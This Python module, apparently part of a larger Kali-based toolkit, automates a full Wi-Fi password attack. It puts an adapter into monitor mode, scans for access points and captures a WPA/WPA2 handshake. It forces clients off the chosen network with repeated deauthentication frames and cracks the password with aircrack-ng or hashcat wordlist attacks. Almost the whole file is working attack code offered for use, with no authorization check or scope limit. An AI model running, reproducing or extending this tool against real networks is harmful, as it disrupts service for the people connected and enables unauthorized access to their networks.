#!/usr/bin/env python3
"""
# Author: sinX
WiFi Handshake Scanner Module
Capture → Clean → Crack WPA/WPA2 handshakes.
Requires: aircrack-ng suite, hcxpcapngtool, hashcat  (all pre-installed on Kali)
Must run as root.
"""

import os
import re
import csv
import time
import shutil
import tempfile
import threading
import subprocess
from typing import Optional, Callable, List, Dict


# ─── Tool check ───────────────────────────────────────────────────────────────

REQUIRED = ["airmon-ng", "airodump-ng", "aireplay-ng", "aircrack-ng"]
OPTIONAL  = {"hcxpcapngtool": False, "hashcat": False}

for t in OPTIONAL:
    OPTIONAL[t] = bool(shutil.which(t))

def check_root() -> bool:
    return os.geteuid() == 0


# ─── Interface helpers ────────────────────────────────────────────────────────

def get_wireless_interfaces() -> List[Dict]:
    """
    Detect all wireless interfaces including USB dongles.
    Uses three methods in priority order:
      1. iw dev          — most reliable for modern drivers & USB adapters
      2. /sys/class/net  — catches anything missed (checks for phy80211 symlink)
      3. iwconfig        — legacy fallback
    """
    ifaces: List[Dict] = []
    seen: set = set()

    # ── Method 1: iw dev ─────────────────────────────────────────────────────
    try:
        out = subprocess.run(
            ["iw", "dev"], capture_output=True, text=True, stderr=subprocess.DEVNULL
        ).stdout
        cur_phy   = ""
        cur_iface = None
        for line in out.splitlines():
            ls = line.strip()
            # "phy#0"
            phy_m = re.match(r'^(phy#\d+)', ls)
            if phy_m:
                cur_phy   = phy_m.group(1)
                cur_iface = None
                continue
            # "Interface wlan0"
            iface_m = re.match(r'^Interface\s+(\S+)', ls)
            if iface_m:
                cur_iface = iface_m.group(1)
                if cur_iface not in seen:
                    seen.add(cur_iface)
                    ifaces.append({"iface": cur_iface, "mode": "managed",
                                   "essid": "", "phy": cur_phy})
                continue
            if cur_iface:
                # "type monitor" / "type managed"
                type_m = re.match(r'^type\s+(\S+)', ls)
                if type_m:
                    for d in ifaces:
                        if d["iface"] == cur_iface:
                            d["mode"] = type_m.group(1)
                            break
                # "ssid MyNetwork"
                ssid_m = re.match(r'^ssid\s+(.+)', ls)
                if ssid_m:
                    for d in ifaces:
                        if d["iface"] == cur_iface:
                            d["essid"] = ssid_m.group(1).strip()
                            break
    except Exception:
        pass

    # ── Method 2: /sys/class/net (catches USB dongles iw dev may miss) ────────
    try:
        for iface in sorted(os.listdir("/sys/class/net")):
            if iface in seen:
                continue
            if os.path.exists(f"/sys/class/net/{iface}/phy80211"):
                seen.add(iface)
                mode = "managed"
                try:
                    r = subprocess.run(
                        ["iw", iface, "info"],
                        capture_output=True, text=True, stderr=subprocess.DEVNULL,
                    )
                    m = re.search(r'\btype\s+(\S+)', r.stdout)
                    if m:
                        mode = m.group(1)
                except Exception:
                    pass
                ifaces.append({"iface": iface, "mode": mode, "essid": "", "phy": ""})
    except Exception:
        pass

    # ── Method 3: iwconfig legacy fallback ───────────────────────────────────
    if not ifaces:
        try:
            out = subprocess.run(
                ["iwconfig"], capture_output=True, text=True, stderr=subprocess.DEVNULL
            ).stdout
            for block in re.split(r'\n(?=\S)', out):
                m = re.match(r'^(\w+)', block)
                if m and "IEEE 802.11" in block:
                    iface = m.group(1)
                    if iface not in seen:
                        seen.add(iface)
                        mode_m  = re.search(r'Mode:(\S+)', block)
                        essid_m = re.search(r'ESSID:"([^"]*)"', block)
                        ifaces.append({
                            "iface": iface,
                            "mode":  mode_m.group(1).lower() if mode_m else "managed",
                            "essid": essid_m.group(1) if essid_m else "",
                            "phy":   "",
                        })
        except Exception:
            pass

    return ifaces


def start_monitor_mode(iface: str, emit: Optional[Callable] = None) -> Optional[str]:
    """Put interface in monitor mode. Returns monitor interface name."""
    def log(msg, lvl="info"):
        if emit: emit({"type": "log", "message": msg, "level": lvl})

    log(f"Killing interfering processes...", "info")
    subprocess.run(["airmon-ng", "check", "kill"], capture_output=True)

    log(f"Starting monitor mode on {iface}...", "info")
    r = subprocess.run(["airmon-ng", "start", iface], capture_output=True, text=True)

    # airmon-ng prints something like "monitor mode enabled on wlan0mon"
    m = re.search(r'monitor mode (?:vif )?enabled.*?on\s+(\w+)', r.stdout + r.stderr, re.I)
    if m:
        mon = m.group(1)
    else:
        # Try common naming conventions
        mon = iface + "mon"
        if not os.path.exists(f"/sys/class/net/{mon}"):
            # Check if original iface is now in monitor mode
            chk = subprocess.run(["iwconfig", iface], capture_output=True, text=True)
            if "Monitor" in chk.stdout:
                mon = iface
            else:
                log("Could not determine monitor interface name", "error")
                return None

    log(f"Monitor interface: {mon}", "ok")
    return mon


def stop_monitor_mode(mon_iface: str, orig_iface: str, emit: Optional[Callable] = None):
    """Restore interface from monitor mode."""
    def log(msg, lvl="info"):
        if emit: emit({"type": "log", "message": msg, "level": lvl})

    log(f"Stopping monitor mode on {mon_iface}...", "info")
    subprocess.run(["airmon-ng", "stop", mon_iface], capture_output=True)
    subprocess.run(["service", "NetworkManager", "start"], capture_output=True)
    log("Interface restored.", "ok")


# ─── Interface mode helper ────────────────────────────────────────────────────

def _get_iface_mode(iface: str) -> str:
    """Return current mode of an interface (managed / monitor / etc.)."""
    try:
        r = subprocess.run(["iw", "dev", iface, "info"],
                           capture_output=True, text=True, stderr=subprocess.DEVNULL)
        m = re.search(r'\btype\s+(\S+)', r.stdout)
        if m:
            return m.group(1).lower()
    except Exception:
        pass
    try:
        r = subprocess.run(["iwconfig", iface],
                           capture_output=True, text=True, stderr=subprocess.DEVNULL)
        m = re.search(r'Mode:(\S+)', r.stdout)
        if m:
            return m.group(1).lower()
    except Exception:
        pass
    return "managed"


# ─── iw dev scan parser ───────────────────────────────────────────────────────

def _parse_iw_scan(output: str) -> List[Dict]:
    """Parse 'iw dev scan' output into a list of AP dicts."""
    aps: List[Dict] = []
    cur: Dict = {}

    for line in output.splitlines():
        ls = line.strip()

        # New BSS entry
        bss_m = re.match(r'^BSS ([0-9A-Fa-f:]{17})', ls)
        if bss_m:
            if cur.get("bssid"):
                aps.append(cur)
            cur = {"bssid": bss_m.group(1).upper(),
                   "essid": "<hidden>", "channel": "?",
                   "privacy": "OPEN", "power": "?"}
            continue

        if not cur:
            continue

        ssid_m = re.match(r'^SSID:\s*(.*)', ls)
        if ssid_m:
            val = ssid_m.group(1).strip()
            if val:
                cur["essid"] = val
            continue

        sig_m = re.match(r'^signal:\s*([-0-9.]+)', ls)
        if sig_m:
            cur["power"] = sig_m.group(1)
            continue

        freq_m = re.match(r'^freq:\s*([0-9.]+)', ls)
        if freq_m:
            try:
                freq = float(freq_m.group(1))
                if freq < 1000:
                    freq *= 1000
                freq = int(freq)
                if 2412 <= freq <= 2472:
                    ch = (freq - 2407) // 5
                elif freq == 2484:
                    ch = 14
                elif 5000 <= freq <= 5885:
                    ch = (freq - 5000) // 5
                elif 5955 <= freq <= 7115:
                    ch = (freq - 5955) // 5 + 1
                else:
                    ch = freq
                cur["channel"] = str(ch)
            except Exception:
                pass
            continue

        pch_m = re.match(r'\* primary channel:\s*([0-9]+)', ls)
        if pch_m:
            cur["channel"] = pch_m.group(1)
            continue

        if re.match(r'^RSN:', ls) or "WPA2" in ls:
            cur["privacy"] = "WPA2"
        elif re.match(r'^WPA:', ls):
            if cur["privacy"] != "WPA2":
                cur["privacy"] = "WPA"
        elif "Privacy" in ls and cur["privacy"] == "OPEN":
            cur["privacy"] = "WEP"

    if cur.get("bssid"):
        aps.append(cur)
    return aps


# ─── AP scanning ─────────────────────────────────────────────────────────────

def scan_aps(
    iface: str,
    duration: int = 15,
    emit: Optional[Callable] = None,
    stop_event=None,
) -> List[Dict]:
    """
    Scan for APs using two methods:
      1. iw dev scan  — works on any managed adapter, instant results
      2. airodump-ng  — passive capture, only if iface is in monitor mode
    Results are merged and deduplicated by BSSID.
    """
    def log(msg, lvl="info"):
        if emit: emit({"type": "log", "message": msg, "level": lvl})

    mode = _get_iface_mode(iface)
    log(f"Adapter {iface} mode: {mode}", "info")

    aps: List[Dict] = []
    seen_bssids: set = set()

    # ── Method 1: iw dev scan (no monitor mode required) ─────────────────────
    log("Scanning with iw dev scan (no monitor mode needed)...", "info")
    try:
        r = subprocess.run(
            ["iw", "dev", iface, "scan"],
            capture_output=True, text=True, timeout=30,
        )
        if r.returncode == 0 and r.stdout.strip():
            iw_aps = _parse_iw_scan(r.stdout)
            for ap in iw_aps:
                bssid = ap["bssid"].upper()
                if bssid not in seen_bssids:
                    seen_bssids.add(bssid)
                    aps.append(ap)
            log(f"iw scan: {len(iw_aps)} AP(s)", "ok" if iw_aps else "warn")
        elif r.stderr.strip():
            log(f"iw scan: {r.stderr.strip()[:120]}", "warn")
            # Try iwlist as fallback
            log("Trying iwlist scan...", "info")
            r2 = subprocess.run(
                ["iwlist", iface, "scan"],
                capture_output=True, text=True, timeout=20,
            )
            if r2.returncode == 0:
                iwl_aps = _parse_iwlist_scan(r2.stdout)
                for ap in iwl_aps:
                    bssid = ap["bssid"].upper()
                    if bssid not in seen_bssids:
                        seen_bssids.add(bssid)
                        aps.append(ap)
                log(f"iwlist scan: {len(iwl_aps)} AP(s)", "ok" if iwl_aps else "warn")
        else:
            log("iw scan returned no output — adapter may need to be up", "warn")
    except subprocess.TimeoutExpired:
        log("iw scan timed out", "warn")
    except FileNotFoundError:
        log("iw not found — install iw package", "error")
    except Exception as e:
        log(f"iw scan error: {e}", "warn")

    # ── Method 2: airodump-ng (only when in monitor mode) ────────────────────
    if mode == "monitor":
        log(f"Monitor mode detected — running airodump-ng ({duration}s passive scan)...", "info")
        tmp = tempfile.mkdtemp(prefix="wg_scan_")
        prefix = os.path.join(tmp, "scan")
        try:
            proc = subprocess.Popen(
                ["airodump-ng", "--write", prefix, "--output-format", "csv",
                 "--write-interval", "2", iface],
                stdout=subprocess.DEVNULL,
                stderr=subprocess.PIPE,
            )
            deadline = time.time() + duration
            while time.time() < deadline:
                if stop_event and stop_event.is_set():
                    break
                time.sleep(2)
                remaining = int(deadline - time.time())
                if remaining % 4 == 0 and remaining > 0:
                    log(f"Passive scan: {remaining}s remaining...", "info")
            proc.terminate()
            try: proc.wait(timeout=3)
            except Exception: proc.kill()

            csv_file = prefix + "-01.csv"
            if os.path.exists(csv_file):
                for ap in _parse_airodump_csv(csv_file):
                    bssid = ap["bssid"].upper()
                    if bssid not in seen_bssids:
                        seen_bssids.add(bssid)
                        aps.append(ap)
                log(f"airodump-ng merged total: {len(aps)} unique AP(s)", "ok")
        except Exception as e:
            log(f"airodump-ng error: {e}", "warn")
        finally:
            shutil.rmtree(tmp, ignore_errors=True)
    else:
        if aps:
            log("Tip: click MON ON then re-scan for passive airodump-ng capture on all channels", "info")
        else:
            log("No APs found. Try: 1) Run as root  2) Bring adapter up  3) Enable monitor mode", "error")

    log(f"Scan complete. {len(aps)} AP(s) found.", "ok" if aps else "warn")
    return aps


def _parse_iwlist_scan(output: str) -> List[Dict]:
    """Parse iwlist scan output as a fallback."""
    aps: List[Dict] = []
    cur: Dict = {}
    for line in output.splitlines():
        ls = line.strip()
        if ls.startswith("Cell "):
            if cur.get("bssid"):
                aps.append(cur)
            bssid_m = re.search(r'Address:\s*([0-9A-Fa-f:]{17})', ls)
            cur = {"bssid": bssid_m.group(1).upper() if bssid_m else "?",
                   "essid": "<hidden>", "channel": "?",
                   "privacy": "OPEN", "power": "?"}
        elif not cur:
            continue
        elif ls.startswith("ESSID:"):
            cur["essid"] = ls.split(":", 1)[1].strip().strip('"') or "<hidden>"
        elif ls.startswith("Channel:"):
            cur["channel"] = ls.split(":", 1)[1].strip()
        elif ls.startswith("Frequency:") and "Channel" in ls:
            m = re.search(r'Channel\s+([0-9]+)', ls)
            if m:
                cur["channel"] = m.group(1)
        elif ls.startswith("Signal level=") or "Signal level" in ls:
            m = re.search(r'Signal level[=:]\s*([-0-9]+)', ls)
            if m:
                cur["power"] = m.group(1)
        elif "Encryption key:on" in ls:
            if cur["privacy"] == "OPEN":
                cur["privacy"] = "WEP"
        elif "IE: IEEE 802.11i/WPA2" in ls or "WPA2" in ls:
            cur["privacy"] = "WPA2"
        elif "WPA Version 1" in ls or ("WPA" in ls and cur["privacy"] != "WPA2"):
            cur["privacy"] = "WPA"
    if cur.get("bssid"):
        aps.append(cur)
    return aps


def _parse_airodump_csv(csv_path: str) -> List[Dict]:
    """Parse airodump-ng CSV output into a list of AP dicts."""
    aps = []
    if not os.path.exists(csv_path):
        return aps
    try:
        with open(csv_path, encoding="utf-8", errors="ignore") as f:
            content = f.read()

        # airodump CSV has two sections separated by a blank line
        # First section = APs, second = clients
        sections = re.split(r'\n\s*\n', content, maxsplit=1)
        reader = csv.DictReader(
            (l.strip() for l in sections[0].splitlines()),
            skipinitialspace=True,
        )
        for row in reader:
            bssid = row.get("BSSID", "").strip()
            if not re.match(r'([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}', bssid):
                continue
            essid   = row.get(" ESSID", row.get("ESSID", "")).strip()
            channel = row.get(" channel", row.get("channel", "?")).strip()
            privacy = row.get(" Privacy", row.get("Privacy", "")).strip()
            power   = row.get(" Power", row.get("Power", "?")).strip()
            aps.append({
                "bssid":   bssid,
                "essid":   essid or "<hidden>",
                "channel": channel,
                "privacy": privacy,
                "power":   power,
            })
    except Exception:
        pass
    return aps


# ─── Handshake capture ────────────────────────────────────────────────────────

def capture_handshake(
    mon_iface: str,
    bssid: str,
    channel: str,
    output_dir: str,
    deauth_count: int = 5,
    timeout: int = 60,
    emit: Optional[Callable] = None,
    stop_event=None,
) -> Optional[str]:
    """
    Capture a WPA handshake for the given BSSID.
    Returns path to .cap file on success, None on failure.
    """
    def log(msg, lvl="info"):
        if emit: emit({"type": "log", "message": msg, "level": lvl})

    prefix = os.path.join(output_dir, f"capture_{bssid.replace(':','')}")

    log(f"Targeting AP: {bssid} (ch {channel})", "info")
    log(f"Starting capture... (timeout={timeout}s)", "info")

    cap_proc = subprocess.Popen(
        ["airodump-ng",
         "--bssid", bssid,
         "-c", str(channel),
         "--write", prefix,
         "--output-format", "cap",
         "--write-interval", "2",
         mon_iface],
        stdout=subprocess.DEVNULL,
        stderr=subprocess.DEVNULL,
    )

    # Give capture a moment to start
    time.sleep(3)

    # Send deauth to force clients to reconnect (triggers handshake)
    if deauth_count > 0:
        log(f"Sending {deauth_count} deauth frames to {bssid}...", "warn")
        subprocess.run(
            ["aireplay-ng", "--deauth", str(deauth_count), "-a", bssid, mon_iface],
            capture_output=True,
            timeout=15,
        )
        log("Deauth sent. Waiting for handshake...", "info")

    cap_file = prefix + "-01.cap"
    deadline = time.time() + timeout
    found    = False

    while time.time() < deadline:
        if stop_event and stop_event.is_set():
            break
        time.sleep(3)

        # Re-send deauth every 15s to keep triggering reconnects
        elapsed = int(time.time() - (deadline - timeout))
        if deauth_count > 0 and elapsed > 0 and elapsed % 15 == 0:
            subprocess.run(
                ["aireplay-ng", "--deauth", "3", "-a", bssid, mon_iface],
                capture_output=True, timeout=10,
            )

        if os.path.exists(cap_file) and _has_handshake(cap_file, bssid):
            log(f"Handshake captured! → {cap_file}", "ok")
            found = True
            break

        remaining = int(deadline - time.time())
        log(f"Waiting for handshake... {remaining}s remaining", "info")

    cap_proc.terminate()
    try: cap_proc.wait(timeout=3)
    except Exception: cap_proc.kill()

    if found and os.path.exists(cap_file):
        return cap_file

    log("No handshake captured within timeout.", "error")
    return None


def _has_handshake(cap_file: str, bssid: str) -> bool:
    """Use aircrack-ng to check if cap file contains a valid handshake."""
    try:
        r = subprocess.run(
            ["aircrack-ng", cap_file],
            capture_output=True, text=True, timeout=10,
        )
        output = r.stdout + r.stderr
        return "handshake" in output.lower() and bssid.upper() in output.upper()
    except Exception:
        return False


# ─── Cap file cleaning ────────────────────────────────────────────────────────

def clean_cap(
    cap_file: str,
    output_dir: str,
    emit: Optional[Callable] = None,
) -> Dict:
    """
    Clean the capture file.
    Returns dict with paths:
      'cap'    → cleaned .cap (always produced)
      'hc22000'→ hashcat-ready hash file (if hcxpcapngtool available)
    """
    def log(msg, lvl="info"):
        if emit: emit({"type": "log", "message": msg, "level": lvl})

    result = {}
    base   = os.path.join(output_dir, "clean")

    # wpaclean if available
    clean_cap_path = base + ".cap"
    if shutil.which("wpaclean"):
        log("Cleaning cap with wpaclean...", "info")
        r = subprocess.run(
            ["wpaclean", clean_cap_path, cap_file],
            capture_output=True, text=True,
        )
        if os.path.exists(clean_cap_path):
            log("Cap cleaned successfully.", "ok")
            result["cap"] = clean_cap_path
        else:
            result["cap"] = cap_file  # use original
    else:
        result["cap"] = cap_file
        log("wpaclean not found — using raw cap.", "warn")

    # Convert to hashcat hc22000 format
    if OPTIONAL.get("hcxpcapngtool"):
        hc_path = base + ".hc22000"
        log("Converting to hc22000 (hashcat format)...", "info")
        r = subprocess.run(
            ["hcxpcapngtool", "-o", hc_path, result["cap"]],
            capture_output=True, text=True,
        )
        if os.path.exists(hc_path) and os.path.getsize(hc_path) > 0:
            log(f"hc22000 hash file ready → {hc_path}", "ok")
            result["hc22000"] = hc_path
        else:
            log("hcxpcapngtool produced no output (may need connected client).", "warn")
    else:
        log("hcxpcapngtool not found — hashcat mode unavailable.", "warn")

    return result


# ─── Cracking ─────────────────────────────────────────────────────────────────

def crack(
    files: Dict,
    wordlist: str,
    bssid: str,
    essid: str,
    method: str = "auto",
    emit: Optional[Callable] = None,
    stop_event=None,
) -> Optional[str]:
    """
    Crack the handshake. method: 'auto' | 'aircrack' | 'hashcat'
    Returns cracked password string or None.
    """
    def log(msg, lvl="info"):
        if emit: emit({"type": "log", "message": msg, "level": lvl})

    if not os.path.exists(wordlist):
        log(f"Wordlist not found: {wordlist}", "error")
        return None

    # Decide method
    use_hashcat = (
        method == "hashcat"
        or (method == "auto" and OPTIONAL.get("hcxpcapngtool") and "hc22000" in files)
    )

    if use_hashcat and "hc22000" in files:
        return _crack_hashcat(files["hc22000"], wordlist, emit, stop_event)
    else:
        return _crack_aircrack(files.get("cap", ""), wordlist, bssid, emit, stop_event)


def _crack_aircrack(
    cap_file: str,
    wordlist: str,
    bssid: str,
    emit: Optional[Callable],
    stop_event,
) -> Optional[str]:
    def log(msg, lvl="info"):
        if emit: emit({"type": "log", "message": msg, "level": lvl})

    log(f"Cracking with aircrack-ng — wordlist: {wordlist}", "info")

    cmd = ["aircrack-ng", "-w", wordlist]
    if bssid:
        cmd += ["-b", bssid]
    cmd.append(cap_file)

    proc = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True)
    password = None

    for line in proc.stdout:
        line = line.strip()
        if stop_event and stop_event.is_set():
            proc.terminate()
            break
        if line:
            log(line, "info")
        m = re.search(r'KEY FOUND!\s*\[\s*(.+?)\s*\]', line, re.I)
        if m:
            password = m.group(1)
            log(f"PASSWORD FOUND: {password}", "secret")
            proc.terminate()
            break
        if "failed. next try" in line.lower() or "not in dictionary" in line.lower():
            log("Key not found in wordlist.", "warn")

    try: proc.wait(timeout=5)
    except Exception: proc.kill()
    return password


def _crack_hashcat(
    hc_file: str,
    wordlist: str,
    emit: Optional[Callable],
    stop_event,
) -> Optional[str]:
    def log(msg, lvl="info"):
        if emit: emit({"type": "log", "message": msg, "level": lvl})

    log(f"Cracking with hashcat (-m 22000) — wordlist: {wordlist}", "info")

    cmd = [
        "hashcat", "-m", "22000", "-a", "0",
        "--status", "--status-timer=5",
        "--quiet",
        hc_file, wordlist,
    ]

    proc = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True)
    password = None

    for line in proc.stdout:
        line = line.strip()
        if stop_event and stop_event.is_set():
            proc.terminate()
            break
        if not line:
            continue
        log(line, "info")
        # hashcat output: hash:password
        m = re.search(r':[^:]{8,}$', line)
        if m and "Status" not in line and "Speed" not in line:
            candidate = m.group(0).lstrip(":")
            if candidate:
                password = candidate
                log(f"PASSWORD FOUND: {password}", "secret")
                proc.terminate()
                break

    # Also check hashcat's potfile
    try: proc.wait(timeout=5)
    except Exception: proc.kill()

    if not password:
        # Check potfile
        potfile = os.path.expanduser("~/.hashcat/hashcat.potfile")
        if os.path.exists(potfile):
            with open(potfile) as f:
                last = f.readlines()[-3:] if os.path.getsize(potfile) > 0 else []
            for entry in reversed(last):
                m = re.search(r':([^:]+)$', entry.strip())
                if m:
                    password = m.group(1)
                    log(f"PASSWORD FOUND (potfile): {password}", "secret")
                    break

    return password


# ─── High-level scanner class ─────────────────────────────────────────────────

class WiFiScanner:
    def __init__(
        self,
        iface: str,
        bssid: str,
        channel: str,
        essid: str,
        wordlist: str,
        deauth_count: int = 5,
        capture_timeout: int = 90,
        crack_method: str = "auto",
        emit: Optional[Callable] = None,
        stop_event=None,
    ):
        self.iface           = iface
        self.bssid           = bssid
        self.channel         = channel
        self.essid           = essid
        self.wordlist        = wordlist
        self.deauth_count    = deauth_count
        self.capture_timeout = capture_timeout
        self.crack_method    = crack_method
        self._emit_cb        = emit
        self._stop           = stop_event
        self._work_dir       = tempfile.mkdtemp(prefix="wg_crack_")
        self.mon_iface       = None
        self.password        = None

    def _log(self, msg, lvl="info"):
        if self._emit_cb:
            self._emit_cb({"type": "log", "message": msg, "level": lvl})

    def _emit(self, payload):
        if self._emit_cb:
            self._emit_cb(payload)

    def run(self) -> Optional[str]:
        if not check_root():
            self._log("ERROR: WiFi scanner requires root privileges.", "error")
            return None

        try:
            # 1. Monitor mode
            self.mon_iface = start_monitor_mode(self.iface, self._emit_cb)
            if not self.mon_iface:
                return None

            # 2. Capture
            cap_file = capture_handshake(
                self.mon_iface, self.bssid, self.channel, self._work_dir,
                self.deauth_count, self.capture_timeout, self._emit_cb, self._stop,
            )
            if not cap_file:
                return None

            # 3. Clean
            files = clean_cap(cap_file, self._work_dir, self._emit_cb)

            # 4. Crack
            self._log(f"Starting crack for {self.essid} ({self.bssid})...", "info")
            password = crack(
                files, self.wordlist, self.bssid, self.essid,
                self.crack_method, self._emit_cb, self._stop,
            )

            if password:
                self.password = password
                self._emit({
                    "type": "wifi_cracked",
                    "data": {
                        "essid":    self.essid,
                        "bssid":    self.bssid,
                        "password": password,
                        "method":   self.crack_method,
                    },
                })
                self._log(f"╔══════════════════════════════════════╗", "secret")
                self._log(f"║  CRACKED: {self.essid}", "secret")
                self._log(f"║  BSSID  : {self.bssid}", "secret")
                self._log(f"║  PASS   : {password}", "secret")
                self._log(f"╚══════════════════════════════════════╝", "secret")
            else:
                self._log("Password not found in wordlist.", "warn")
                self._emit({"type": "wifi_failed", "data": {"essid": self.essid, "bssid": self.bssid}})

            return password

        finally:
            if self.mon_iface:
                stop_monitor_mode(self.mon_iface, self.iface, self._emit_cb)
            shutil.rmtree(self._work_dir, ignore_errors=True)
